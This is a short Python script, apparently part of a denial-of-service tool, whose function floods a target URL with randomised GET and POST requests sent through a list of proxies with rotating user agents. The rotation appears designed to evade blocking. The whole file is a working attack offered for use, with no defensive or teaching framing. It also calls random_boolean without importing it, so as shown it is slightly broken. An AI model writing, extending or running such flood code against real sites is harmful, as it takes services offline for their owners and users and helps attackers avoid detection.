import time
from utils.http_bot import HTTPBot
from utils.random_utils import random_item, random_string

def start_flood_attack(target, proxies, user_agents, duration, packet_size):
    bots = [HTTPBot(proxy, random_item(user_agents)) for proxy in proxies]
    end_time = time.time() + duration

    while time.time() < end_time:
        for bot in bots:
            if random_boolean():
                bot.get_request(target + "/" + random_string(packet_size))
            else:
                bot.post_request(target, random_string(packet_size))
            time.sleep(0.1)
